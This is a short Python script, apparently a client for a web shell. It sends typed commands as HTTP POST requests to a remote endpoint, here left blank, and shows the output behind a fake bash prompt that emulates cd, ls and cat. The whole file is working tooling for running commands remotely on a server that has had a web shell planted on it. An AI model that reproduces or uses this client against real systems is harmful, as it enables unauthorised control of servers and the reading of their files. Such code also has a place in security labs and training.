import pdb
import requests
import json
from termcolor import colored
#from termcolor import *
import re
import sys
import colorama
from tabulate import tabulate
import numpy as np

colorama.init()

url = ""

def send_cmd(cmd):
	result = requests.post(url = url, data = {'comando':cmd})
	return json.loads(result.text)['valor']

def parse_dir(ddir):
	ddir = ddir.split('/')	#split /
	while('' in ddir):		#remove empty
	    ddir.remove('')
	return ddir				#return dir tuple

def str_dir(ddir):
	return '/'+'/'.join(ddir) #print full dir path

c_dir = send_cmd('pwd').replace('\n','')
c_user = send_cmd('whoami').replace('\n','')
c_host = send_cmd('hostname').replace('\n','')

ddir = parse_dir(c_dir)

try:

	while True:

		print(colored(c_user+"@"+c_host, 'green')+':'+colored(str_dir(ddir), 'blue')+" $ ", end='')
		cmd = input()

		if (cmd.startswith('cd')):

			if (cmd[3:].startswith('..')):			# parent directory
				if (ddir):							# if dir not empty (root dir)
					ddir.pop()
				continue

			check_ddir = ddir.copy()				# check dir to test if exists / aaaaa BUG DE MIERDA
			new_ddir = cmd[3:].split('/') 			# 'cd dir/dir/dir' from input
			
			while('' in new_ddir):					# remove white spaces
				new_ddir.remove('')
			
			if (cmd[3:].startswith('/')):			# cd from root directory
								
				dir_exists = send_cmd(f'if test -d "{str_dir(new_ddir)}"; then echo "true"; else echo "false"; fi').replace('\n','')
				if dir_exists == 'true':
					ddir = new_ddir
				else:
					print(f'cd: {str_dir(new_ddir)}: No such file or directory')
				continue

			for sub_ddir in new_ddir:				# for each subdir append to check
				check_ddir.append(sub_ddir)

			dir_exists = send_cmd(f'if test -d "{str_dir(check_ddir)}"; then echo "true"; else echo "false"; fi').replace('\n','')

			if dir_exists == 'true':
				ddir = check_ddir 
			elif dir_exists == 'false':
				print(f'cd: {str_dir(check_ddir)}: No such file or directory')

		elif (cmd.startswith('ls')):
			
			# if(cmd == 'ls'):
			# 	files = send_cmd(f'{cmd} {str_dir(ddir)}').replace('\n', '').split(' ')	
			# 	files = np.array_split(files, 10)
			# 	for row in files:
			# 		print("{:15s} {:15s} {:15s} {:15s} {:15s} {:15s} {:15} {:15} {:15s} {:15s}".format(*row))

			if('/' in cmd):

				print(send_cmd(cmd))

			else:

				print(send_cmd(f'{cmd} {str_dir(ddir)}'))

		elif (cmd.startswith('cat')):

			if('/' in cmd):

				print(send_cmd(cmd))

			else:
			
				print(send_cmd(f'cat {str_dir(ddir)}/{cmd[4:]}'))

		else:
			print(send_cmd(cmd))

except KeyboardInterrupt:
	print('\nWebshell terminated.')
	exit()

